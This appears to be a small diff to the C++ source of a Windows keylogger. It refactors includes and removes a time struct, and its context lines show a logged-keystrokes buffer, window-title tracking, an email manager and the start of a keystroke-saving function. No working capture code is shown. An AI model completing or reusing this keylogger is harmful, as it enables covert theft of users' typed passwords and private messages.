@@ -1,10 +1,4 @@
-﻿#include <windows.h>
-#include <tlhelp32.h>
-#include <ctime>
-#include <iostream>
-#include <string>
-#include <stdio.h>
-using namespace std;
+﻿#include "LoggingManager.h"
 
 DataManager dataManager = new DataManager();
 EmailManager emailManager = new EmailManager();
@@ -15,11 +9,6 @@ HWND window;
 time_t rawStartTime, rawEndTime;
 HANDLE myhandle;
 string startTime, endTime, loggedKeystrokes, wnd_title;
-
-struct timeStruct {
-    time_t rawtime;
-    string str;
-};
 
 void save (int key_stroke){
     // ignore input from any key that is not alpha, num, enter, tab and backspace
